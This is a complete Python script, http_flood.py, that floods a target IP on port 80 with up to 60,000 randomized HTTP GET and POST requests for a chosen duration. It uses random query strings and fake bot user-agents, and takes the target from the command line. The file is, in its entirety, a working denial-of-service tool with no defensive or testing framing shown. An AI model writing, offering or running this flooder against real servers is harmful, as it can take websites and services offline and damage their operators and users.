#!/usr/bin/env python3
import socket
import random
import time
import sys
import string


paths = ["/", "/login", "/api", "/data", "/products"]


def random_string(n=6):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def build_http_payload():
    method = random.choice(["GET", "POST"])
    path = random.choice(paths) + "?id=" + random_string()

    headers = [
        "Host: example.com",
        f"User-Agent: Bot/{random.randint(1,10)}",
        "Connection: close"
    ]

    body = ""
    if method == "POST":
        body = "data=" + random_string(20)
        headers.append(f"Content-Length: {len(body)}")

    return f"{method} {path} HTTP/1.1\r\n" + \
           "\r\n".join(headers) + "\r\n\r\n" + body


def http_flood(target_ip, duration):

    target_flows = 60000
    flows_created = 0
    start = time.time()

    while flows_created < target_flows and (time.time() - start) < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)

            # Kernel chooses source IP + port automatically
            s.connect((target_ip, 80))

            payload = build_http_payload().encode()
            s.sendall(payload)

            try:
                s.recv(1024)
            except:
                pass

            s.close()
            flows_created += 1

        except:
            pass

    print(f"Approx HTTP flows generated: {flows_created}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: http_flood.py <target_ip> <duration>")
        sys.exit(1)

    http_flood(sys.argv[1], int(sys.argv[2]))